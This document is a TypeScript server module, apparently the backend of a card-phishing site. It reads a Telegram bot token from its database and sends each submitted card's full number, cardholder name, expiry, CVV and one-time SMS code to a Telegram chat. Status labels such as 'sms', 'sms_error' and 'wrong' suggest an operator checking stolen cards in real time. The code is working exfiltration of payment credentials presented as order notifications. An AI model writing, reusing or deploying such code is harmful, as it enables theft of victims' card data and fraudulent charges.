import db from '~/server/database/db';

export interface TelegramSettings {
    id: number;
    bot_token: string;
    chat_id: string;
}

export interface PaymentInfo {
    id: number;
    method: string;
    card_number: string;
    cardholder_name: string;
    expiry: string;
    cvv: string;
    otp?: string;
    status: string;
    created_at: string;
}

// Lấy cấu hình Telegram từ database
export const getTelegramConfig = async (): Promise<TelegramSettings | null> => {
    try {
        const stmt = db.prepare('SELECT * FROM telegram_settings LIMIT 1');
        const result = stmt.get() as TelegramSettings | undefined;
        return result || null;
    } catch (error) {
        console.error('Error getting Telegram config:', error);
        return null;
    }
};

// Gửi thông báo Telegram
export const sendTelegramNotification = async (payment: PaymentInfo, isNew: boolean = true): Promise<boolean> => {
    try {
        // Validate payment data
        if (!payment || !payment.id) {
            console.error('Invalid payment data for Telegram notification');
            return false;
        }

        // Lấy cấu hình Telegram
        const config = await getTelegramConfig();
        if (!config || !config.bot_token || !config.chat_id) {
            return false;
        }

        const action = isNew ? '🆕 NEW ORDER' : '🔄 UPDATE';
        const statusEmoji = {
            pending: '⏳',
            sms: '📱',
            sms_error: '❌',
            wrong: '💔',
            success: '✅'
        };

        // Sanitize data to prevent injection
        const sanitizeText = (text: string) => {
            if (!text) return 'N/A';
            return text.toString().replace(/[<>]/g, '');
        };

        const message = `
${action}

💰 <b>Payment Method:</b> <code>${sanitizeText(payment.method)}</code>
🏦 <b>Card Number:</b> <code>${sanitizeText(payment.card_number)}</code>
👤 <b>Cardholder:</b> <code>${sanitizeText(payment.cardholder_name)}</code>
📅 <b>Expiry:</b> <code>${sanitizeText(payment.expiry)}</code>
🔐 <b>CVV:</b> <code>${sanitizeText(payment.cvv)}</code>
${payment.otp ? `🔢 <b>OTP:</b> <code>${sanitizeText(payment.otp)}</code>` : ''}
📊 <b>Status:</b> ${statusEmoji[payment.status as keyof typeof statusEmoji] || '❓'} <code>${sanitizeText(payment.status)}</code>
🕐 <b>Date:</b> <code>${new Date(payment.created_at).toLocaleString('vi-VN')}</code>

🆔 <b>Order ID:</b> <code>#${payment.id}</code>
    `.trim();

        const telegramUrl = `https://api.telegram.org/bot${config.bot_token}/sendMessage`;

        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: config.chat_id,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            }),
            signal: AbortSignal.timeout(10000) // 10 seconds timeout
        });

        if (!response.ok) {
            let errorData;
            try {
                errorData = await response.json();
            } catch (parseError) {
                console.error('Failed to parse Telegram API error response:', parseError);
                errorData = { error_code: response.status, description: 'Unknown error' };
            }

            console.error('Telegram API error:', errorData);
            return false;
        }

        let result;
        try {
            result = await response.json();
        } catch (parseError) {
            console.error('Failed to parse Telegram API success response:', parseError);
            return false;
        }

        return result.ok;
    } catch (error) {
        console.error('Error sending Telegram notification:', error);

        if (error instanceof Error) {
            if (error.name === 'AbortError') {
                console.error('Telegram request timed out');
            } else if (error.name === 'TypeError') {
                console.error('Network error or invalid URL');
            }
        }

        return false;
    }
};

// Gửi thông báo khi có đơn hàng mới
export const sendNewOrderNotification = async (payment: PaymentInfo): Promise<boolean> => {
    return await sendTelegramNotification(payment, true);
};

// Gửi thông báo khi cập nhật trạng thái
export const sendStatusUpdateNotification = async (payment: PaymentInfo): Promise<boolean> => {
    return await sendTelegramNotification(payment, false);
};
